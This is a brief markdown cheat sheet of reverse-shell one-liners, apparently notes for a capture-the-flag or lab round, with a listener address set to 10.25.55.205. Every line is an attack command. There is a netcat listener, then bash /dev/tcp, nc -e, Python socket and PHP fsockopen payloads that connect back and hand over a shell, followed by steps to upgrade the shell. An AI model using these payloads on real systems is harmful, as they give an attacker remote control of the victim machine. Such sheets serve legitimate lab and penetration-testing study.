# Reverse shells (LHOST=10.25.55.205 (2026-09-13 round))
- Listen: `nc -lvnp LPORT` (or `rlwrap nc -lvnp LPORT`)
- bash:  `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`
- nc:    `nc -e /bin/bash LHOST LPORT`
- python:`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
- php:   `php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'`
- Stabilise: `python3 -c 'import pty;pty.spawn("/bin/bash")'` then Ctrl-Z, `stty raw -echo; fg`
